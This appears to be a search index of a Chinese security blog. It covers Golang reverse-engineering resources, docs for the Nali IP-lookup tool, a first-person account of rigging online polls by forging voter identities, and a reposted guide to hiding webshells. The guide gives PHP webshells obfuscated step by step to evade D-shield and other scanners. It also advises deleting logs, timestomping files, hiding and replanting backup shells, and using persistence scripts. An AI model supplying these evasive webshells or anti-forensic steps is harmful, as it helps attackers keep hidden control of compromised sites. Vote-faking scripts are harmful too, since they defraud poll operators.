[{"categories":["reverse"],"content":"前段时间从逆向xray开始入门Golang逆向，打算深入学习一下Golang逆向方法，这几天看了很多相关的文章，原本想要自己总结一文，但无奈大佬们的总结太全面了，我就直接扔链接吧 ","date":"2020-10-05","objectID":"https://lgf.im/posts/security/reverse/golang-reverse/:0:0","tags":["reverse","golang"],"title":"Golang逆向资料","uri":"https://lgf.im/posts/security/reverse/golang-reverse/"},{"categories":["reverse"],"content":"Go二进制文件逆向分析从基础到进阶 J!4Yu大佬的系列文章太全面了，他写的go_parser相当好用 综述 MetaInfo、函数符号和源码文件路径列表 数据类型 itab与strings Tips与实战案例 ","date":"2020-10-05","objectID":"https://lgf.im/posts/security/reverse/golang-reverse/:1:0","tags":["reverse","golang"],"title":"Golang逆向资料","uri":"https://lgf.im/posts/security/reverse/golang-reverse/"},{"categories":["reverse"],"content":"英文文章 Reversing GO binaries like a pro Bsides-GO-Forth-And-Reverse Reconstructing Program Semantics from Go binaries JEB Analyzing Golang Executables The Go low-level calling convention on x86-64 ","date":"2020-10-05","objectID":"https://lgf.im/posts/security/reverse/golang-reverse/:2:0","tags":["reverse","golang"],"title":"Golang逆向资料","uri":"https://lgf.im/posts/security/reverse/golang-reverse/"},{"categories":["reverse"],"content":"操作文章和总结 手把手教你如何专业地逆向GO二进制程序 inctf(ultimateGo) Go语言逆向去符号信息还原 无符号Golang程序逆向方法解析 golang语言编译的二进制可执行文件为什么比 C 语言大 Go-逆向学习问题总结 ","date":"2020-10-05","objectID":"https://lgf.im/posts/security/reverse/golang-reverse/:3:0","tags":["reverse","golang"],"title":"Golang逆向资料","uri":"https://lgf.im/posts/security/reverse/golang-reverse/"},{"categories":["reverse"],"content":"工具和插件 https://github.com/strazzere/golang_loader_assist https://github.com/sibears/IDAGolangHelper https://github.com/0xjiayu/go_parser https://github.com/CarveSystems/gostringsr2 https://github.com/JacobPimental/r2-gohelper https://github.com/sysopfb/GoMang https://github.com/pnfsoftware/jeb-golang-analyzer https://gitlab.com/zaytsevgu/goutils https://gitlab.com/zaytsevgu/GoUtils2.0 ","date":"2020-10-05","objectID":"https://lgf.im/posts/security/reverse/golang-reverse/:4:0","tags":["reverse","golang"],"title":"Golang逆向资料","uri":"https://lgf.im/posts/security/reverse/golang-reverse/"},{"categories":["ctf"],"content":" 转自：酒仙桥六号部队 https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug 这个公众号的文章质量都非常高，推荐大家关注 拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验： ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:0:0","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"制作免杀webshell 隐藏webshell最主要的就是做免杀，免杀做好了，你可以把webshell放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个webshell就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。 ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:1:0","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"命令执行的方法 这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法 直接执行 使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。 @eval('echo 这是输出;'); 动态函数执行 我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行 $a=\"phpinfo\";$a(); 文件包含执行 有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果 b.php \u003c?php @eval('echo 这是输出;'); a.php \u003c?php include a.php ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:1:1","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"回调函数 将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子： \u003c?php $func = 'system'; $arr = array('whoami'); array_map($func, $arr); ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:1:2","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"PHP Curly Syntax 我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果 \u003c?php $a = 'p'; eval(\"{$a}hpinfo();\"); ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:1:3","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"php反序列化 这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize \u003c?php class test{ public $a=\"123\"; public function __wakeup(){ eval($this-\u003ea); } } unserialize('O:4:\"test\":1:{s:1:\"a\";s:10:\"phpinfo();\";}'); ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:1:4","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"php://input方法 php://input可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，php://input会读取到，这时候我们就可以加以利用了。 \u003c?php @eval(file_get_contents('php://input')); ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:1:5","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"preg_replace方法 preg_replace函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令。 \u003c?php echo preg_replace(\"/test/e\",phpinfo(),\"jutst test\"); ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:1:6","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"ob_start ob_start函数是打开输出控制缓冲，传入的参数会在使用ob_end_flush函数的时候去调用它执行输出在缓冲区的东西。 \u003c?php $cmd = 'system'; ob_start($cmd); echo \"whoami\"; ob_end_flush();//输出全部内容到浏览器 ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:1:7","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"编写免杀 上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的。 assert($_POST['x']); 这种就是最简单的一句话木马，使用D盾扫一下，可以看到5级，没有什么好说的。 动态函数方法,把assert这个函数赋值两次变量,再把变量当成函数执行。 $c = \"assert\"; $c($_POST['x']); 回调函数方法，把assert函数当作参数传给array_map去调用执行。 \u003c?php $fun = 'assert'; array_map($fun,array($_POST['x'])); 可以看到上面的都是通过两种方法的结合，简单的处理一下，就变成了4级，感兴趣的可以把其他的方法都尝试一下，4级的很简单，我们去看看3级的都是怎么处理的 通过上面的动态函数方法我们可以思考，函数可以当成字符串赋值给变量，那么变量也一定能当成字符串赋值给变量，但调用时需要用$$ \u003c?php $a = \"assert\"; $c ='a'; $$c($_POST['x']); 我们在把这种方法结合到回调函数方法中，可以看到，已经是2级了 \u003c?php $fun = 'assert'; $f = 'fun'; array_map($$f,array($_POST['x'])); 这时候我们看一下D盾中的说明：array_map中的参数可疑，我们这时候可以用函数封装一下参数 \u003c?php function ass(){ $a = \"a451.ass.aaa.ert.adaww\"; $b = explode('.',$a); $c = $b[1] . $b[3]; return $c; } $b = array($_POST['x']); $c = ass(); array_map($c,$b); 1级了，离目标近在咫尺了，这时候我们应该考虑让一句话木马像正常的代码，在好好的封装一下 \u003c?php functiondownloadFile($url,$x){ $ary = parse_url($url); $file = basename($ary['path']); $ext = explode('.',$file); // assert $exec1=substr($ext[0],3,1); $exec2=substr($ext[0],5,1); $exec3=substr($ext[0],5,1); $exec4=substr($ext[0],4,1); $exec5=substr($ext[0],7,2); $as[0] = $exec1 . $exec2 . $exec3 . $exec4 . $exec5; $as[1] = $x; return $as; } $a = $_POST['x']; $s = downloadFile('http://www.baidu.com/asdaesfrtafga.txt',$a); $b = $s[0]; $c = $s[1]; array_map($b,array($c)); 再试试其他免杀工具。 WebShellKiller： 安全狗： 微步云沙箱： 再试试可不可以连接没有问题，完美！！ ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:2:0","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["ctf"],"content":"更好的隐藏webshell一些建议 拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除 把webshell的属性时间改为和同目录文件相同的时间戳,比如linux中的touch就是非常好的工具 目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到,尽量藏在那些程序员和管理员都不会经常光顾的目录中比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录 利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中 尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析 上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马 靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件 如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用 webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php 如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到 养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到 当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建 在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了 ","date":"2020-08-08","objectID":"https://lgf.im/posts/security/web-security/hide-your-webshell/:3:0","tags":["ctf","coding","webshell"],"title":"如何优雅的隐藏你的Webshell","uri":"https://lgf.im/posts/security/web-security/hide-your-webshell/"},{"categories":["coding"],"content":"Nali 一个查询IP地理信息和CDN提供商的离线终端工具 ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:0:0","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"来源 该工具受 Nali C版本 和 nali-cli js版本 的启发. 我想要在终端对IP地理信息和CDN服务提供商进行查询，发现了Nali这个工具，Nali与哪里谐音，非常适合这类工具 经过简单的使用，我发现最初的C语言版本功能缺失，而苏卡卡大佬的js版本包实在大的恐怖、而支持的平台非常有限，所以我用golang重写了这个工具，在原有功能的基础上增加了对IPv6的支持，并且增加了Geoip2数据库 ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:1:0","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"功能 纯真 IPv4 离线数据库 ZX IPv6 离线数据库 Geoip2 城市数据库 (可选) IPIP 数据库 (可选) CDN 服务提供商查询 支持管道处理 支持交互式查询 同时支持IPv4和IPv6 查询完全离线 全平台支持 ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:2:0","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"安装 ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:3:0","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"从源码安装 Nali 需要预先安装 Go. 安装后可以从源码安装软件: $ go get -u -v github.com/zu1k/nali ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:3:1","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"下载预编译的可执行程序 可以从Release页面下载预编译好的可执行程序: Release 你需要选择适合你系统和硬件架构的版本下载，解压后可直接运行 ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:3:2","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"使用 Docker 版本 docker pull docker.pkg.github.com//zu1k/nali/nali:latest ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:3:3","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"使用说明 ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:0","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"查询一个IP的地理信息 $ nali 1.2.3.4 1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络] 或者 使用 管道 $ echo IP 6.6.6.6 | nali IP 6.6.6.6 [美国 亚利桑那州华楚卡堡市美国国防部网络中心] ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:1","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"同时查询多个IP的地理信息 $ nali 1.2.3.4 4.3.2.1 123.23.3.0 1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络] 4.3.2.1 [美国 新泽西州纽瓦克市Level3Communications] 123.23.3.0 [越南 越南邮电集团公司] ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:2","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"交互式查询 使用 exit 或 quit 退出查询 $ nali 123.23.23.23 123.23.23.23 [越南 越南邮电集团公司] 1.0.0.1 1.0.0.1 [美国 APNIC\u0026CloudFlare公共DNS服务器] 8.8.8.8 8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器] quit ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:3","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"与 dig 命令配合使用 需要你系统中已经安装好 dig 程序 $ dig nali.lgf.im +short | nali 104.28.2.115 [美国 CloudFlare公司CDN节点] 104.28.3.115 [美国 CloudFlare公司CDN节点] 172.67.135.48 [美国 CloudFlare节点] ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:4","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"与 nslookup 命令配合使用 需要你系统中已经安装好 nslookup 程序 $ nslookup nali.lgf.im 8.8.8.8 | nali Server: 8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器] Address: 8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器]#53 Non-authoritative answer: Name: nali.lgf.im Address: 104.28.3.115 [美国 CloudFlare公司CDN节点] Name: nali.lgf.im Address: 104.28.2.115 [美国 CloudFlare公司CDN节点] Name: nali.lgf.im Address: 172.67.135.48 [美国 CloudFlare节点] ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:5","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"与任意程序配合使用 因为 nali 支持管道处理，所以可以和任意程序配合使用 bash abc.sh | nali Nali 将在 IP后面插入IP地理信息，CDN域名后面插入CDN服务提供商信息 ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:6","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"支持IPv6 和 IPv4 用法完全相同 $ nslookup google.com | nali Server: 127.0.0.53 [局域网 IP] Address: 127.0.0.53 [局域网 IP]#53 Non-authoritative answer: Name: google.com Address: 216.58.211.110 [美国 Google全球边缘网络] Name: google.com Address: 2a00:1450:400e:809::200e [荷兰Amsterdam Google Inc. 服务器网段] ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:7","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"查询 CDN 服务提供商 因为 CDN 服务通常使用 CNAME 的域名解析方式，所以推荐与 nslookup 或者 dig 配合使用，在已经知道 CNAME 后可单独使用 只查询 CDN 服务提供商 $ nslookup www.gov.cn | nali cdn Server: 127.0.0.53 Address: 127.0.0.53#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.148 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 185.232.56.147 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 查询所有信息 $ nslookup www.gov.cn | nali Server: 127.0.0.53 [局域网 IP] Address: 127.0.0.53 [局域网 IP]#53 Non-authoritative answer: www.gov.cn canonical name = www.gov.cn.bsgslb.cn [白山云 CDN]. www.gov.cn.bsgslb.cn [白山云 CDN] canonical name = zgovweb.v.bsgslb.cn [白山云 CDN]. Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 103.104.170.25 [新加坡 ] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::5 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] Name: zgovweb.v.bsgslb.cn [白山云 CDN] Address: 2001:428:6402:21b::6 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)] 单独使用 需要提前查询到 CNAME 域名 $ nali cdn cdn.somecdncname.com ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:4:8","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"用户交互 ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:5:0","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"查看帮助 $ nali --help Usage: nali [flags] nali [command] Available Commands: cdn Query cdn service provider help Help about any command parse Query IP information update update chunzhen ip database Flags: -h, --help help for nali -t, --toggle Help message for toggle Use \"nali [command] --help\" for more information about a command. ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:5:1","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"更新纯真数据库 $ nali update 2020/07/17 12:53:46 正在下载最新纯真 IP 库... 2020/07/17 12:54:05 已将最新的纯真 IP 库保存到本地 /root/.nali/qqwry.dat ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:5:2","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"使用 Geoip2 数据库 需要设置环境变量： NALI_DB 支持的变量内容: Geoip2 ['geoip', 'geoip2', 'geo'] Chunzhen ['chunzhen', 'qqip', 'qqwry'] Windows平台 使用geoip数据库 set NALI_DB=geoip 使用ipip数据库 set NALI_DB=ipip Linux平台 使用geoip数据库 export NALI_DB=geoip 使用ipip数据库 export NALI_DB=ipip ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:5:3","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"更换数据库目录 如果未指定数据库存放目录，数据库默认将存放在 ~/.nali 设置环境变量 NALI_DB_HOME 来指定数据库目录 set NALI_DB_HOME=D:\\nalidb or export NALI_DB_HOME=/home/nali ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:5:4","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"感谢列表 纯真QQIP离线数据库 qqwry mirror qqwry纯真数据库解析 ZX公网ipv6数据库 Geoip2 city数据库 geoip2-golang解析器 CDN provider数据库 IPIP数据库 IPIP数据库解析 Cobra CLI库 Nali-cli ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:6:0","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"开源证书 MIT ","date":"2020-07-17","objectID":"https://lgf.im/posts/coding/nali-golang/:7:0","tags":["coding"],"title":"Nali IP地理信息和CDN服务商查询","uri":"https://lgf.im/posts/coding/nali-golang/"},{"categories":["coding"],"content":"相信大家都经历过朋友圈、群组里各种转发求投票的消息，有需求就会有刷票 关于刷票我自己也稍微研究过，这里说的刷票是指刷投票，不是黄牛那种抢票 ","date":"2020-07-13","objectID":"https://lgf.im/posts/security/web-security/brush-votes/:0:0","tags":["coding"],"title":"关于刷票","uri":"https://lgf.im/posts/security/web-security/brush-votes/"},{"categories":["coding"],"content":"初识刷票 人生中第一次刷票是在大一，舍友的姐姐结婚拍婚纱照，摄影店给了一个点赞链接，承诺点赞数量超过500票免费送豪华相册和相框 舍友让我们帮着转发和点赞，这种东西大家都懂，不想污染了朋友圈，但又不能不帮舍友，碰巧当时正在研究微信抓包啥的，便想研究一下看看能不能刷票 投票网页要求必须微信打开，如果是普通浏览器打开不让投票，但是在微信进行投票它也没有弹出那个获取微信个人信息的确认框，这让我怀疑他根本没有利用微信的信息进行身份确认，有可能可以伪造身份进行刷票 早期微信抓包非常简单，手机root后安装xposed，使用JustTrustMe插件信任所有证书，然后手机安装burp的证书，wifi使用burp的代理，然后就能使用burp对https进行抓包了 抓包后发现投票的确没有仔细检查个人信息，于是通过Burp的Intruder伪造了身份，重放几百次顺利给舍友刷取几百票，圆满完成他姐姐交给他的任务 ","date":"2020-07-13","objectID":"https://lgf.im/posts/security/web-security/brush-votes/:1:0","tags":["coding"],"title":"关于刷票","uri":"https://lgf.im/posts/security/web-security/brush-votes/"},{"categories":["coding"],"content":"前几天的刷票 前几天出于好奇又刷了一波票，这次经历是我写这篇文章的主要动机 前几天，我们导员、任课老师、教务等疯狂发钉钉、朋友圈、QQ群、QQ空间，让帮我们学弟投票 随手投上一票，发现投票网站需要使用姓名和手机号码注册，但是没有验证手机验证码，并且没有限制浏览器，感觉必有刷票的机会 于是对网页的所有请求进行抓包分析，发现投票是使用WebSocket进行的，投票时只需要给出登录成功的token和要投的队伍号 关键就在这个登录上了，如果能够有效验证投票者身份就能够减轻刷票，但是分析注册和登录请求发现并没有对用户身份进行有效验证，手机号码可以随便伪造 并且，姓名字段没有任何要求，没有限制长度，没有限制必须是中文，随便一个字符串就能被接受 于是写了一个程序，自动伪造身份登录、投票，循环这个过程 ","date":"2020-07-13","objectID":"https://lgf.im/posts/security/web-security/brush-votes/:2:0","tags":["coding"],"title":"关于刷票","uri":"https://lgf.im/posts/security/web-security/brush-votes/"},{"categories":["coding"],"content":"认识与建议 上面两个案例是成功的刷票经历，我也经历过几次失败的刷票经历，在失败的经历中，那些投票系统都是利用微信提供的用户信息验证用户身份，而微信本身对用户审核的很严（没办法伪造），我也没有多个微信号，刷票自然失败 实际上，刷票过程最重要的是伪造投票者身份，欺骗投票系统是不同用户进行的投票，所以投票系统防刷票最重要的就是验证用户身份 在实际应用中有很多验证用户身份的方法： 验证手机号（发验证码的那种） 验证是否真人（极验、reCaptcha） 利用微信提供的身份 对于验证手机号，刷票组织可以轻松的获取大量手机号，包括各种真号码、虚拟号码，这种方法可以轻松绕过 对于使用机器人验证器，绕过比较麻烦，但是也是可以通过程序绕过的，并且刷票组织有可能人力手工进行验证 使用微信提供的身份信息是最难搞的，因为微信本身审核的很严，提供的身份又无法伪造，这里利用的是微信对用户身份的验证，是可以信任的。但是也不是没有绕过的方法，刷票组织有时候会养了大批量的微信号用来刷票，利用群控手段也可以绕过。 并且，有很多刷票组织养着很多群，可以提供真人投票服务，这种刷票成本非常高，但是是无法检测的，刷票成功率100% 针对刷票行为，无法完全避免，我们能做的就是通过各种方式对用户身份进行验证，检查用户IP，尽量避免身份伪造 同时，可以对投票请求的频率等信息进行分析，因为脚本刷票投票会很集中、时间间隔会比较均匀 ","date":"2020-07-13","objectID":"https://lgf.im/posts/security/web-security/brush-votes/:3:0","tags":["coding"],"title":"关于刷票","uri":"https://lgf.im/posts/security/web-security/brush-votes/"},{"categories":["reverse"],"content":"在前段时间对xray进行逆向过程中，发现golang编译的程序会有巨多函数，不能说都是多余的，但是大部分函数的确不是用户编写的代码生成的，而是golang运行时和各种库所需要的东西 同时，因为去除了符号表，这些大量的非实际业务代码会对我们逆向工作造成极大困难，如果能够利用一些自动化工具重建符号表或者重新命名，就可以极大的便利我们逆向 ","date":"2020-06-20","objectID":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/:0:0","tags":["coding","reverse","golang"],"title":"Golang逆向思考","uri":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/"},{"categories":["reverse"],"content":"golang特殊段 在本次逆向的过程中，我遇到了上述的问题，在网上搜索发现了一个ida插件， IDAGolangHelper 这个插件的作者对golang编译器有深入的研究，他发现golang编译器在linux平台下交叉编译windows平台下运行的程序时，会生成一个特殊的段.gopclntab，在这个段中会保存一份特殊的符号表，作者利用这个段的信息对符号表进行了重建，我在使用过程中发现效果不错 但是该方法的使用是由限制条件的，如果没有这个段的信息就完全无法使用这个工具了 ","date":"2020-06-20","objectID":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/:1:0","tags":["coding","reverse","golang"],"title":"Golang逆向思考","uri":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/"},{"categories":["reverse"],"content":"基于同源性 golang编译生成的程序中大部分函数都是golang运行时函数和一些库函数 运行时函数与golang版本、运行平台和操作系统有关，感觉也会与是否采用交叉编译有关系，我没有深入研究 而库函数分为官方库和第三方库两种，官方库是golang官方维护的基本函数库，大家用的都是相同的，第三方库大家用的实际上也是比较集中，golang生态还不是非常完善，好用的库就那么多 基于以上的特点，我们可以考虑使用同源性分析的方法 ","date":"2020-06-20","objectID":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/:2:0","tags":["coding","reverse","golang"],"title":"Golang逆向思考","uri":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/"},{"categories":["reverse"],"content":"预先的工作 在逆向之前，我们需要进行预先的准备 首先需要使用不同版本、不同平台的golang编译器对go运行时函数、基本库函数、知名第三方库函数等代码针对不同目标平台、目标系统进行编译，生成二进制程序，然后对二进制的函数提取特征，建立函数的特征库 ","date":"2020-06-20","objectID":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/:2:1","tags":["coding","reverse","golang"],"title":"Golang逆向思考","uri":"https://lgf.im/posts/security/reverse/golang-reverse-thinking/"},{"categories":["reverse"],"content":"特征匹配 在逆向的时候，我们就可以先分析程序的golang版本、编译平台、运行平台，然后使用相对应的特征库对去除了符号表的二进制函数进行特征匹配，通过这种方法可以对大部分基本的函数重建符号表，而剩余的小量函数便可以确定为用户编写的代码，需要我们深入分析 这个工作应该已经有人开始做了 